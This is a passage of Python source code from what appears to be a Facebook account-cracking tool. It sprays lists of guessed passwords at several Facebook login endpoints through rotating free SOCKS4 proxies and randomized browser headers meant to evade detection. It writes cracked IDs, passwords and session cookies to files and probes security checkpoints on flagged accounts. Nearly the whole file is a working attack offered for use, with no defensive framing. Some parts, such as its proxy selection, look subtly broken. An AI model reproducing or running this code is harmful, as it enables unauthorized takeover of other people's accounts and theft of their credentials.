				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
				elif 'asyinc' in method:
				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.facebook.com')
				else:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				    
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} OK {hijo}: %s'%(ok))
	print(f'{kun}└──[{puti} CP {kun}: %s'%(cp))
	print(f"{kun}─────────────────────────────────────────────{puti}")
	
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} V %s(%s {loop} %s) (%s OK : {ok} %s) (%s CP : {cp} %s)"%(puti,hijo,puti,hijo,puti,kun,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ref = rc([f"https://{url}/login/device-based/password/?uid="+idf+"&flow=login_no_pin&refsrc=deprecated&_rdr"])
			link = ses.get(f"https://{url}/login/device-based/password/?uid="+idf+"&flow=login_no_pin&refsrc=deprecated&_rdr")
			date ={"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next":f"https://{url}/login/save-device/",
	        "flow":"login_no_pin",
	        "pass":pw,
	        }     
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			ver = rc(["id-ID,id;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  		
			head={'Host': url,
	        'cache-control': 'max-age=0',
	        'dpr': f'{str(rr(1,9))}',
	        'viewport-width': f'{str(rr(400,999))}',
	        'sec-ch-ua': f'"Chromium";v="{str(rr(99,115))}", "Google Chrome";v="{str(rr(99,115))}", "Not:A-Brand";v="{str(rr(8,20))}"',
	        'sec-ch-ua-mobile': '?1',
	        'sec-ch-ua-platform': '"Android"',
	        'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	        'sec-ch-ua-full-version-list':f'"Chromium";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Google Chrome";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Not:A-Brand";v="{str(rr(8,20))}.0.0.0"',
	        'sec-ch-prefers-color-scheme': 'light',
	        'upgrade-insecure-requests': '1',
	        'origin': 'https://'+url,
	        'content-type': 'application/x-www-form-urlencoded',
	        'user-agent': ua,
	        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	        'x-requested-with': 'XMLHttpRequest',
	        'sec-fetch-site': 'same-origin',
	        'sec-fetch-mode': 'cros',
	        'sec-fetch-user': '?1',
	        'sec-fetch-dest': 'empty',
	        'referer': ref,
	        'accept-encoding': 'gzip, deflate, br',
	        'accept-language': f'{ver},en-US;q=0.8,en;q=0.7'}
			rdm = rc(["id_ID","jv_ID","id_ID_ID","jv_ID_ID"])
			links = rc([f"https://{url}/login/device-based/validate-password/?shbl=0&locale2={rdm}"])
			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{hijo}{kuki}{puti}")
				tree.add(f"{ung}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{ung}{ua}{hijo}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-REGULER ]----------#	
def crackreguler(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} R %s(%s {loop} %s) (%s OK : {ok} %s) (%s CP : {cp} %s)"%(puti,hijo,puti,hijo,puti,kun,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ver = rc(["en-GB,en-US;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  		
			ses.headers.update({"Host":url,
			"upgrade-insecure-requests":"1",
			"user-agent":ua,
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"dnt":f"{str(rr(1,9))}",
			"x-requested-with":"mark.via.gp",
			"sec-fetch-site":"same-origin",
			"sec-fetch-mode":"cors",
			"sec-fetch-user":"empty",
			"sec-fetch-dest":"document",
			"referer":f"https://{url}/",
			"accept-encoding":"gzip, deflate br",
			"accept-language":f"{ver},en;q=0.8"})
			link = ses.get('https://m.facebook.com/login/?email='+idf).text
			date = {'lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw}
			ses.headers.update({'Host': url,
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-user': 'empty',
			'sec-fetch-dest': 'document',
			'referer': f'https://{url}/login/?email='+idf,
			'accept-encoding':'gzip, deflate br',
			'accept-language':f'{ver},en;q=0.8'})
			links = rc([f"https://{url}/login/login/device-based/regular/login/?shbl=1&refsrc=deprecated"])
			CYXIEON_XR = ses.post(links,data=date,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{hijo}{kuki}{puti}")
				tree.add(f"{ung}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{ung}{ua}{hijo}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-ASYINC ]----------#	
def crackasyinc(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} A %s(%s {loop} %s) (%s OK : {ok} %s) (%s CP : {cp} %s)"%(puti,hijo,puti,hijo,puti,kun,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ref = rc(["https://free.facebook.com/v11.0/dialog/oauth?app_id=2099441543493930&cbt=1694016682169&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfa031ad37b7cfc%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff1c8f0ce4c4803c%26relation%3Dopener&client_id=2099441543493930&display=touch&domain=account.hoyoverse.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Faccount.hoyoverse.com%2F%3Flang%3Did%23%2Flogin%3Fcb_route%3D%252Faccount%252FaccountInfo&locale=id_ID&logger_id=ff8a9c507c4f28&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df4fe7221d2314%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff1c8f0ce4c4803c%26relation%3Dopener%26frame%3Df397f4a437b8a4c&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v11.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified"])
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=2099441543493930&kid_directed_site=0&app_id=2099441543493930&signed_next=1&next=https%3A%2F%2F{url}%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'true',
			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"__dyn": "",
			"__csr": "",
			"__req": rc(["1","2","3","4","5","6","7","8","9","0","a","b","c","d","f","g","h","i","j","k","l","m","n","n","o","p","q"]),
			"__a": "",
			"__user": "0",
			"_fb_noscript": "true"}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			ver = rc(["id-ID,id;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  
			head = {"Host": url,
			"content-length": f"str(rr(2000,2999))",
			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua,
			"viewport-width": f"str(rr(400,989)",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
			"x-asbd-id": "129477",
			"x-requested-with": "com.android.chrome",
			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://"+url,
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": ref,
			"accept-encoding": "gzip, deflate, br",
			"accept-language": ver}		
			links = rc([f"https://{url}/login/device-based/login/async/?api_key=2099441543493930&auth_token=ed9cb45a485f81810505130bc83f37bb&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2099441543493930&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100"])
			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{hijo}{kuki}{puti}")
				tree.add(f"{ung}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				cp+=1
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{ung}{ua}{hijo}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ CEK-OPSI ]----------#	
def ceker(idf,pw):
	global cp
	rc = random.choice
	url = rc(["mbasic.facebook.com"])
	head = {"Host": url,
"cache-control": "max-age=0",
"upgrade-insecure-requests": "1",
"origin": "https://"+url,
"content-type": "application/x-www-form-urlencoded",
"user-agent": "Mozilla/5.0 (Linux; Android 10; DOOGEE B10 Build/KOTG49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"x-requested-with": "com.android.chrome",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "navigate",
"sec-fetch-user": "?1",
"sec-fetch-dest": "document",
"referer": f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
"accept-encoding": "gzip, deflate",
"accept-language": "fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://'+url)
		kontol = sop(ses.post(
		'https://'+url+'/login.php',
		data={
		'email':idf,
	'pass':pw,
'login':'submit'
		},headers=head, allow_redirects=True).text,'html.parser')
		jo = kontol.find(
		'form'
		)
		data = {}
		lion = [
		'nh',
	'jazoest',
'fb_dtsg',
	'submit[Continue]',
		'checkpoint_data'
		]
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://'+url+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{hijo}Tapyes / A2f ( cek di mbasic ){puti}")
			prints(tree)
			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
			#cp+=1
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
		tree.add(f"{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}")
		tree.add(f"{mer}spam ip tidak dapat cek ops{puti}i")
		prints(tree)
		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
		#cp+=1
		
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('CYXIEON-OK')
	except:pass
	try:os.mkdir('CYXIEON-CP')
	except:pass
	menu()
	
	
#>>>>> THANKS TO <<<<<#

#    *--> BASARI ID
#    *--> ALVINO ADIJAYA
#    *--> AOREC-XD

#>>>>> THANKS TO <<<<<#

